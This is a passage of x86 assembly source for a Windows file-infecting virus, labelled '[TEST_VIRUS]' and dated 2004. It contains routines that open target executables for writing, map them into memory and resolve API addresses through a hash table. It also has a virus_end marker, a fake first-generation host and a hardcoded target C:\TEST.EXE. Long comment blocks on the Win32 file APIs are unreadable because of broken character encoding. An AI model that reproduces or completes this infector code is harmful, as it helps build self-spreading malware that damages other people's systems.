 ;   2^32-2. ���� ��� ��p����p �����, �� ������������ p����p p���� 2^64-2.  ;
 ;   ����� ��� ��p����p �p������� ��p���� ������� ����� �������, ��� ������ ;
 ;   ���������� �������� ���������.                                         ;
 ;                                                                          ;
 ; � dwMoveMethod: ������ ���p����� �������, ������ ������ ���������        ;
 ;   �������� ���������. ���� ��p���� ����� ���� p���� ������ �� ���������  ;
 ;   ��������:                                                              ;
 ;                                                                          ;
 ;     ���������      ��������                                              ;
 ;                                                                          ;
 ;   + FILE_BEGIN   - ���p����� ������� p���� ���� ��� ������ �����. ����   ;
 ;                    ������ ��� ���������, DistanceToMove ����p�p���p����� ;
 ;                    ��� ����� ����������� ������� ��������� ���������.    ;
 ;                                                                          ;
 ;   + FILE_CURRENT - ���p����� �������� �������� ������� ���������         ;
 ;                    ��������� ���������.                                  ;
 ;                                                                          ;
 ;   + FILE_END     - ���p����� �������� �������� ����� �����.              ;
 ;                                                                          ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� SetFilePointer �p���� �������, ����p�������         ;
 ;   �������� - ��� ������ ������� ����� ����� ������� ��������� ���������, ;
 ;   � ���� lpDistanceToMoveHigh �� ���� p���� NULL, ������� ��������       ;
 ;   ��p���� ������� ����� � LONG, �� ����p�� ��������� ���� ��p����p.      ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������ � lpDistanceToMoveHigh p���� NULL,        ;
 ;   ����p������� �������� p����� 0xFFFFFFFF. ����� �������� p����p�����    ;
 ;   ����p����� �� ������, �������� GetLastError.                           ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������ � lpDistanceToMoveHigh �� p���� NULL,     ;
 ;   ����p������� �������� p���� 0xFFFFFFFF � GetLastError ����p����        ;
 ;   ��������, �������� �� NO_ERROR.                                        ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; ������� SetEndOfFile ��p������� ������� ����� ����� (EOF) � �������      ;
 ; ������� ��������� ���������.                                             ;
 ;                                                                          ;
 ; BOOL SetEndOfFile(                                                       ;
 ;   HANDLE hFile        // ����� �����                                     ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � hFile: ������ ����, ��� ������ ���� ��p������� EOF-�������. �����      ;
 ;   ����� ������ ���� ������� � �������� GENERIC_WRITE.                    ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� �� p����      ;
 ;   ����.                                                                  ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� ����. �����  ;
 ;   �������� �������������� ����p����� �� ������, �������� GetLastError.   ;
 ;                                                                          ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ESI - ��������� �� ��� �����, ����p�� ����� ���p���
 ; output:
 ;      EAX - ����� ����� � ������ ������

OpenFile        proc
        xor     eax,eax
        push    eax
        push    eax
        push    00000003h
        push    eax
        inc     eax
        push    eax
        push    80000000h or 40000000h
        push    esi
        call    [ebp+_CreateFileA]
        ret
OpenFile        endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� CreateFile ������� ��� ���p����� �������, ������ ����p��         ;
 ; �p������ ����, � ����p����� �����, ����p�� ����� ������������ ���        ;
 ; ��p������ � ���:                                                         ;
 ;                                                                          ;
 ;      + ����� (��� ����p���� ������ ���)                                  ;
 ;      + �����                                                             ;
 ;      + ���������                                                         ;
 ;      + ���������������� p���p�� (���p���p, COM-��p��)                    ;
 ;      + �������� ���p������ (������ Windows NT)                           ;
 ;      + �������                                                           ;
 ;      + ��p����p�� (������ ���p����)                                      ;
 ;                                                                          ;
 ; HANDLE CreateFile(                                                       ;
 ;   LPCTSTR lpFileName, // ��������� �� ��� �����                          ;
 ;   DWORD dwDesiredAccess,      // p���� ������� (������-������)           ;
 ;   DWORD dwShareMode,  // p���� p����������� �������                      ;
 ;   LPSECURITY_ATTRIBUTES lpSecurityAttributes, // ����. �� ���p. �����.   ;
 ;   DWORD dwCreationDistribution,       // ��� ���������                   ;
 ;   DWORD dwFlagsAndAttributes, // ���p����� �����                         ;
 ;   HANDLE hTemplateFile        // ����� �����, ��� ���p����� ����p�����   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � lpFileName: ��������� �� ��p���, ����p�������� NULL'��, ����p�� ������ ;
 ;   ��� ������������ ��� ���p�������� ������� (����, ����, ��������,       ;
 ;   ���������������� p���p�, �������� ���p������, ������� ��� ��p����p��). ;
 ;   ���� lpFileName �������� �����, �� �� ��������� ��p�������� �� p����p  ;
 ;   p����p ��p��� ���������� MAX_PATH ��������. ��� ��p�������� ������� �� ;
 ;   ����, ��� CreateFile ��p��� ����.                                      ;
 ;                                                                          ;
 ; � dwDesiredAccess: ������ ��� ������� � �������. �p�������� �����        ;
 ;   �������� ������ ������, ������, ������-������ ��� ������ ���p��� �     ;
 ;   ���p������.                                                            ;
 ;                                                                          ;
 ; � dwShareMode: ������������� ������� �����, ����p�� ��p�������, �����    ;
 ;   ��p���� ����� �p��������� p���������� (�����p�������) ������ �         ;
 ;   �������. ���� dwShareMode p���� ����, ����� p���������� ������ ��      ;
 ;   ����� ��������. ����������� ���p���� ���p���� ������� �� ��������,     ; 
 ;   ���� ����� �� ����� ���p��.                                            ;
 ;                                                                          ;
 ; � lpSecurityAttributes: ��������� �� ��p����p� SECURITY_ATTRIBUTES,      ;
 ;   ����p�� ��p������� ����� �� ����p������� ����� ������������� ����p���  ;
 ;   �p�������. ���� lpSecurityAttributes p���� NULL, ����� �� �����        ;
 ;   �������������.                                                         ;
 ;                                                                          ;
 ; � dwCreationDistribution: ��p�������, ��� ���������� �������, ���� ����  ;
 ;   ���������� ��� ���� ��� ���.                                           ;
 ;                                                                          ;
 ; � dwFlagsAndAttributes: ������ ���p����� ����� � ����� �����.            ;
 ;                                                                          ;
 ; � hTemplateFile: ������ ����� � �������� GENERIC_READ � �����-�������.   ;
 ;   ��������� ������ �������� � p����p����� ���p����� ��� ������������     ;
 ;   �����. Windows95: ��� �������� ������ ���� p���� NULL. ���� �� ���     ;
 ;   ���� ���p�������� �������� ��p������� � �������� ������� ��p����p�     ;
 ;   �����-������ �����, ����� �� �������, � GetLastError ����p����         ;
 ;   ERROR_NOT_SUPPORTED.                                                   ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� ����� ������� ;
 ;   ��������� �����. ���� ��������� ���� ����������� �� ������ �������, �  ;
 ;   dwCreationDistribution ��� p���� CREATE_ALWAYS ��� OPEN_ALWAYS, �����  ; 
 ;   GetLastError ����p���� ERROR_ALREADY_EXISTS (���� ���� ����� �������   ;
 ;   �p���� �������). ���� ���� �� ����������� �� ������, GetLastError      ;
 ;   ����p���� ����.                                                        ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p����              ;
 ;   INVALID_HANDLE_VALUE (-1). ����� �������� �������������� ����p����� �� ;
 ;   ������, �������� GetLastError.                                         ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ECX - p����p ��������
 ; output:
 ;      EAX - ����� ��������, ���� ����� �p���� �������

CreateMap       proc
        xor     eax,eax
        push    eax
        push    ecx
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_CreateFileMappingA]
        ret
CreateMap       endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� CreateFileMapping ������� ����������� ��� ����������             ;
 ; �p������p������� ������.                                                 ;
 ;                                                                          ;
 ; HANDLE CreateFileMapping(                                                ;
 ;   HANDLE hFile,       // ����� �����, ����p�� ���������� �p������p�����. ;
 ;   LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // ���. ���p. ��������. ;
 ;   DWORD flProtect,    // ������ �p������p�������� �������                ;
 ;   DWORD dwMaximumSizeHigh,    // ��p���� 32 ���� p����p� �������         ;
 ;   DWORD dwMaximumSizeLow,     // ������ 32 ���� p����p� �������          ;
 ;   LPCTSTR lpName      // ��� �p������p�������� �������                   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � hFile: ������ ����, �� ����p��� ����� ������ �p������p������ ������.   ;
 ;   ���� ������ ���� ���p�� � p����� �������, ����������� � �������        ;
 ;   ������, ��������� flProtect. ������������, ���� � �� �p�������, �����  ;
 ;   �����p����� ����� ���� ���p��� � p����� ��������������� �������.       ;
 ;   ���� hFile p���� (HANDLE)0xFFFFFFFF, ���������� �p����� ����� ������   ;
 ;   ������ p����p �����p�������� ������� ��p����p��� dwMaximumSizeHigh �   ;
 ;   dwMaximumSizeLow. ������� ������� �p������p������� ������ ����������   ;
 ;   p����p�. ������ ����� ������� p���������� � ������� �����p������,      ;
 ;   ������������ ��� �����.                                                ;
 ;                                                                          ;
 ; � lpFileMappingAttributes: ��������� �� ��p����p� SECURITY_ATTIBUTES,    ;
 ;   �����������, ����� �� ����p������� ����� ������������� ����p����       ;
 ;   �p��������. ���� lpFileMappingAttributes p���� NULL, ����� �� �����    ;
 ;   ���� �����������.                                                      ;
 ;                                                                          ;
 ; � flProtect: ������ ����� ������.                                        ;
 ;                                                                          ;
 ; � dwMaximumSizeHigh: ������ ��p���� 32 ���� ������������� p����p�        ;
 ;   �p������p�������� �������.                                             ;
 ;                                                                          ;
 ; � dwMaximumSizeLow: ������ ������ 32 ���� ������������� p����p�          ;
 ;   �p������p�������� �������. ���� ���� ��p����p � dwMaximumSizeHigh      ;
 ;   p���� ����, ������������ p����p ����� p���� �������� p����p� �����,    ;
 ;   ��� ����� ��p���� � hFile.                                             ;
 ;                                                                          ;
 ; � lpName: ��������� �� ��p���, �������� ��� �p������p�������� �������.   ;
 ;   ��� ����� ����p���� ����� ������� �p��� ��p������ ����� (\).           ;
 ;   ���� ���� ��p����p ��������� � ������ ��� �������������                ;
 ;   �p������p�������� �������, ������� ���p������� ������ � ������ �       ;
 ;   �������, �������� � flProtect.                                         ;
 ;   ���� ���� ��p����p p���� NULL, ������ ��������� ��� �����.             ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� ��������      ;
 ;   ������� �����p�������� �������. ���� ������ ����������� �� ������      ;
 ;   �������, GetLastError ����p���� ERROR_ALREADY_EXISTS, � ����p�������   ;
 ;   �������� ����� �������� ��p��� ������� ������������� ������� (� ���    ;
 ;   ������� p����p��, � �� �������� � �������). ���� ������ �� ����������� ;
 ;   p����, GetLastError ����p���� ����.                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� ����� p���� NULL.  ;
 ;   ����� �������� �������������� ����p����� �� ������, ��������           ;
 ;   GetLastError.                                                          ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ECX - �����p
 ; output:
 ;      EAX - ��p�� � ������ ������

MapFile         proc
        xor     eax,eax
        push    ecx
        push    eax
        push    eax
        push    00000002h
        push    dword ptr [ebp+MapHandle]
        call    [ebp+_MapViewOfFile]
        ret
MapFile         endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� MapViewOfFile �����p��� ��p�� ����� � ��p����� �p���p������      ;
 ; ����������� �������.                                                     ;
 ;                                                                          ;
 ; LPVOID MapViewOfFile(                                                    ;
 ;   HANDLE hFileMappingObject,  // �p������p������ ������                  ;
 ;   DWORD dwDesiredAccess,      // p���� �������                           ;
 ;   DWORD dwFileOffsetHigh,     // ��p���� 32 ���� �������� �����          ;
 ;   DWORD dwFileOffsetLow,      // ������ 32 ���� �������� �����           ;
 ;   DWORD dwNumberOfBytesToMap  // ���������� �����p����� ������           ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � hFileMappingObject: ����������p��� ���p���� ����� �p������p��������    ;
 ;   �������. ����� ����� ����p����� ������� CreateFileMapping �            ;
 ;   OpenFileMapping.                                                       ;
 ;                                                                          ;
 ; � dwDesireAccess: ������ ��� ������� � �p������p������� � ��p�����       ;
 ;   �p���p������ �p������ ��p������ �����.                                 ;
 ;                                                                          ;
 ; � dwFileOffsetHigh: ������ ��p���� 32 ���� �������� � �����, ������      ;
 ;   �������� �����p������.                                                 ;
 ;                                                                          ;
 ; � dwFileOffsetLow: ������ ������ 32 ���� �������� � �����, ������        ;
 ;   �������� �����p������.                                                 ;
 ;                                                                          ;
 ; � dwNumberOfBytesToMap: ������ ���������� ����, ����p�� �����            ;
 ;   �����p����� � ��p����� �p���p������ �p������. ����                     ;
 ;   dwNumberOfBytesToMap p���� ����, ���� �������� �������.                ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� ��������      ;
 ;   ��p�� ������ ����p�������� ������� �����.                              ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� NULL. �����  ;
 ;   �������� �������������� ����p����� �� ������, �������� GetLastError.   ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

mark_   db      "[TEST_VIRUS]",0
        db      "(c) 2004 BEavER Inc.",0
	db	"Test only!",0

APITable:
;	_ActivateActCtx		dd ?

	_CreateFileA		dd ?
	_GetFileSize		dd ?
	_GetFileAttributesA	dd ?
	_SetFilePointer		dd ?
	_SetFileAttributesA	dd ?
	_CloseHandle		dd ?
	_CreateFileMappingA	dd ?
	_MapViewOfFile		dd ?
	_UnmapViewOfFile	dd ?
	_SetEndOfFile		dd ?

HeshTable:                                    ;������� ����� �������
;	ActivateActCtx_		dd 0416166F2h

	CreateFileA_		dd 0860B38BCh
	GetFileSize_		dd 0AAC2523Eh
	GetFileAttributesA_	dd 03D7D6496h
	SetFilePointer_		dd 07F3545C6h
	SetFileAttributesA_	dd 0152DC5D4h
	CloseHandle_		dd 0F867A91Eh
	CreateFileMappingA_	dd 01F394C74h
	MapViewOfFile_		dd 0FC6FB9EAh
	UnmapViewOfFile_	dd 0CA036058h
	SetEndOfFile_		dd 0059C5E24h
				dw 0FFFFh     ;End of HeshTable

	FileHandle              dd ?
	MapHandle               dd ?
	MapAddress              dd ?
	dwFileAttributes	dd ?
	nFileSize		dd ?
	szFileName		db "C:\TEST.EXE",0

;                        align   dword
virus_end               label   byte

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; H������� ��p���� ���������                                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

virsus:
;	pushad
;	pushfd

	jmp	start

fakehost:
;        pop     dword ptr fs:[0]                ; �������� ���-��� �� �����
;        add     esp,4
;        popfd
;        popad

        xor     eax,eax                         ; ����p����� MessageBox �
        push    eax                             ; ������ ����������
        push    offset szTitle
        push    offset szMessage
        push    eax
        call    MessageBoxA

        push    00h                             ; ����p���� p����� ��������
        call    ExitProcess

end     virsus
